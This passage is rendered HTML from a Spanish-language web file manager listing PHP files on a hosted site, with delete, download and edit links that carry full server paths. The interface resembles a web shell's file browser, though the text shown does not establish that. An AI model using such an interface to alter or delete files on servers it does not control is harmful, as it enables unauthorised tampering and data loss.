                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">mod-history.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">monitor.php</a></td>
                    <td>Archivo</td>
                    <td>6.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">next.php</a></td>
                    <td>Archivo</td>
                    <td>430 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">notificaciones-ajax.php</a></td>
                    <td>Archivo</td>
                    <td>5.63 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">password-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">password-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">password.php</a></td>
                    <td>Archivo</td>
                    <td>2.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">perfil.php</a></td>
                    <td>Archivo</td>
                    <td>43.44 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">playlist.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">post.borrar.php</a></td>
                    <td>Archivo</td>
                    <td>630 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">post.php</a></td>
                    <td>Archivo</td>
                    <td>69 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">posts.php</a></td>
                    <td>Archivo</td>
                    <td>2.84 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">ppdias.php</a></td>
                    <td>Archivo</td>
                    <td>1.07 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">prev.php</a></td>
                    <td>Archivo</td>
                    <td>439 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">preview.php</a></td>
                    <td>Archivo</td>
                    <td>3.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">privacidad-de-datos.php</a></td>
                    <td>Archivo</td>
                    <td>7.99 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">protocolo.php</a></td>
                    <td>Archivo</td>
                    <td>11.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">recaptcha.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">recomendar-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">recomendar.php</a></td>
                    <td>Archivo</td>
                    <td>1.14 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">registro-check-email.php</a></td>
                    <td>Archivo</td>
                    <td>214 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">registro-check-nick.php</a></td>
                    <td>Archivo</td>
                    <td>232 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">registro-confirmar.php</a></td>
                    <td>Archivo</td>
                    <td>698 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">registro-form.php</a></td>
                    <td>Archivo</td>
                    <td>24.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">registro-geo.php</a></td>
                    <td>Archivo</td>
                    <td>1.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">registro-notificacion.php</a></td>
                    <td>Archivo</td>
                    <td>303 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">registro2.php</a></td>
                    <td>Archivo</td>
                    <td>4.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">registrooff.php</a></td>
                    <td>Archivo</td>
                    <td>21.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">salir.php</a></td>
                    <td>Archivo</td>
                    <td>299 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">session.php</a></td>
                    <td>Archivo</td>
                    <td>1.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">staff.php</a></td>
                    <td>Archivo</td>
                    <td>4.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
